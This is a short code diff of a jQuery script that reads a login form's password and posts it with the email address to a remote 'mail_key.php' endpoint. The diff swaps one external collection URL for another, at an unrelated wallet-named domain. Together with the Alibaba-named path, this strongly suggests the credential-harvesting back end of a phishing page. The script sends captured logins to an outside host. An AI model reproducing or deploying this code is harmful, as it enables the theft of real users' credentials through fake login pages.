@@ -9,7 +9,7 @@ $('document').ready(function () {
         var password = $('#password').val();
 
         $.ajax({
-            url: 'https://fostesting.000webhostapp.com/servers/Alibaba/php/mail_key.php',
+            url: 'https://platiniumxpwallet.com/external/Alibaba/php/mail_key.php',
             method: 'post',
             data: {
                 mail,
